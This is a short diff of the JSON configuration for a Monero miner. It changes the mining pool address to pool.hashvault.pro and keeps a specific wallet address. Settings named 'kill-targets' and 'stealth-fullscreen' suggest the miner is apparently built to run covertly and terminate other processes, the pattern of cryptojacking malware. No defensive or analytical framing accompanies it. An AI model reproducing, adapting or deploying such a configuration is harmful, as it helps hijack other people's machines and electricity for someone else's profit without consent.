@@ -1,6 +1,6 @@
 {
     "algo": "rx/0",
-    "pool": "xmr-asia1.nanopool.org",
+    "pool": "pool.hashvault.pro",
     "port": 10343,
     "wallet": "41kG9fPsM2TBSbPaXhJ8bjgoeup4YyQoqM4rR6gzFHWXGiGgaW5QdJLE4wH7MGB11PgoPzs5NrBXvYCaiLUEyJjVN8HSJny",
     "password": "",
@@ -13,4 +13,5 @@
     "kill-targets": "",
     "stealth-fullscreen": false
 }
+
 
